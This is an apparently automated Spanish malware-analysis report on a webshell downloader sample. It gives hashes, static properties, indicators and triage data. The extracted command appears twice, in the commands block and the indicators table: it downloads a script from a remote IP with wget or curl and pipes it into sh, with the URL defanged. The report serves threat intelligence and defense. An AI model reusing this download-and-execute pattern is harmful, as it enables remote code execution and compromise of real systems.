# 🧬 Payload Analysis

`fab931b8c53e7abcc326d4f0c2afb734a8e206adc5d20e7c7caccde3e051cb08`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/downloader/fab931b8c53e7abcc326d4f0c2afb734a8e206adc5d20e7c7caccde3e051cb08.md](../../../../../malware-like/oraculo/downloader/fab931b8c53e7abcc326d4f0c2afb734a8e206adc5d20e7c7caccde3e051cb08.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:07:44.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `fab931b8c53e7abcc326d4f0c2afb734a8e206adc5d20e7c7caccde3e051cb08`
- **SHA1:** `a788361aaed1abf2e19c33dbdfaff4240a0d9510`
- **MD5:** `b24790c19608bb42b6d7909ababc3b95`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (324), with CRLF line terminators |
| Tamaño | 1.8 KiB |
| Entropía | 5.79 |
| Strings | 33 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (324), with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| ip | 190.179.172.XXX | static_analysis |
| ip | 217.60.195.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | fab931b8c53e7abcc326d4f0c2afb734a8e206adc5d20e7c7caccde3e051cb08 | static_analysis |
| ip | 79.76.58.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
